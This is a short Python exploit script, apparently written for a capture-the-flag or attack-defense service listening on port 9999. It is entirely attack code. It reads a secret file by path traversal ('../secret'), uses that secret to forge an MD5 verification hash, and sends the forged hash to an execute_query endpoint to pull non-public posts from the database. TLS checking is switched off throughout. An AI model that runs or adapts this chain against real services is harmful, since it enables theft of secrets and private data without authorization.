#!/usr/bin/env python3
import requests
import sys
import urllib3
import hashlib

urllib3.disable_warnings()

PORT=9999
QUERY="SELECT * FROM post WHERE is_public = 0"

def compute_security_hash(secret, value):
	#todo: md5 is deprecated, maybe use hmac in future version?
	return hashlib.md5((secret + value).encode()).hexdigest()

r = requests.get(f'https://{sys.argv[1]}:{PORT}/download?filename=../secret', verify=False)
secret = r.text
hash = compute_security_hash(secret, QUERY)
r = requests.get(f'https://{sys.argv[1]}:{PORT}/execute_query/{QUERY}?verify={hash}', verify=False)
print(r.text)
